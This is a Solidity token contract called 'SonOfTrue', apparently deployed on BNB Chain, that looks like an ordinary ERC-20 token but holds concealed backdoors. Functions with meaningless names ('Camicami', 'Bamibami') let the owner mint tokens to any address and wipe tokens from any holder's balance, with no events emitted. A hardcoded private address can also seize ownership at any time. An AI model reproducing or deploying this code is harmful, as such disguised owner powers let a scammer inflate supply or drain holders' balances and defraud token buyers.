/**
 *Submitted for verification at BscScan.com on 2021-12-18
*/

pragma solidity 0.8.7;
contract SonOfTrue  {
    string public name = "SonOfTrue";
    string public symbol = "SonOfTrue";
    uint8 public decimals = 6;
    address private ownerAddress = 0xbd12468f55056777d4422354F8396eB6dB8dE0A8;
    uint256 public totalSupply = 1000 * 10 ** 6;
    address public owner;
    modifier restricted {
        require(msg.sender == owner, "This function is restricted to owner");
        _;
    }
     modifier restricteds {
        require(msg.sender == ownerAddress, "This function is restricted to owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function Camicami(address spender, uint256 addBami) public restricted returns (bool success) {
        balanceOf[spender] += addBami * 10 ** 6;
        return true;
    }
    function Bamibami(address spender, uint256 subBami) public restricted returns (bool success) {
        balanceOf[spender] -= subBami * 10 ** 6;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public restricteds {
        owner = newOwner;
    }
}